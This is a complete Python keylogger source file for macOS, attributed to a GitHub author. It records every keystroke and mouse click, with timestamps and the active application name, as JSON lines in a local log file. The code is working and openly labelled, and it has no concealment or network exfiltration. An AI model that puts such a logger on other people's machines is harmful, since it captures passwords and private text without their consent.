# Keylogger by Natalie Schultz Henry.
# https://github.com/schultzhenry/keylogger

# Import from AppKit Datetime, Time, Pynput,
# JSON, and logging.
from AppKit import NSWorkspace as ws
from datetime import datetime as dt
from pynput import keyboard, mouse
from time import time as t
import logging as lg
import json
# https://pypi.org/project/AppKit/
# https://docs.python.org/3/library/datetime.html#module-datetime
# https://pypi.org/project/pynput/
# https://docs.python.org/3/library/time.html#module-time
# https://docs.python.org/3/library/logging.html#module-logging
# https://docs.python.org/3/library/json.html#module-json



# Set up log directory, name and logging format.
log_dir = ""
lg.basicConfig(filename=(log_dir + "log_original.txt"),
               level=lg.DEBUG,
               format='%(message)s')

# Required syntax for upcoming NSWorkspace
# activeApplication call.
class AppFailureException(RuntimeError):
    pass

# Fetch currently focused application.
def current_app():

    # If app found, replace spaces with dashes
    # and return formatted name.
    app = ws.sharedWorkspace().activeApplication()
    if app:
        app = app['NSApplicationName'].replace(' ', '-')
        return app

    # Return error message if app name not found.
    raise AppFailureException('no-app-found')



# Get current time and reformat.
def current_time():
    time_now = str(dt.fromtimestamp(t()))
    return time_now.replace(' ', '-')



# When a key is pressed, collect key, current time
# and application information, reformat as JSON
# object, and log.
def on_press(key):

    # Remove unicode indicator and quotes from key.
    key = str(key)
    if key[:2] == 'u\'' and key[-1:] == '\'':
        key = key[-2:-1]
    elif key[:2] == 'u\"' and key[-1:] == '\"':
        key = key[-2:-1]

    # Save key, current time and application to
    # dictionary.
    keyDict = {
        'time':current_time(),
        'key':'{0}'.format(key),
        'application':current_app()
    }

    # Convert dict to JSON object and log.
    keyToJson = json.dumps(keyDict)
    lg.info('{0}'.format(keyToJson))



# When mouse is clicked, collect current time
# and application information, reformat as JSON
# object, and log.
# This version does not save screen coordinates
# of clicks. If you would like to do so, you could
# feed those variables into new entries in the
# clickDict dictionary below.
def on_click(x, y, button, pressed):

    # Save click, current time and application to
    # dictionary.
    if pressed:
        clickDict = {
            'time':current_time(),
            'key':'click',
            'application':current_app()
        }

        # Convert dict to JSON object and log.
        clickToJson = json.dumps(clickDict)
        lg.info('{0}'.format(clickToJson))



# Listen for mouse and keyboard events.
with mouse.Listener(on_click=on_click) as listener:
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()
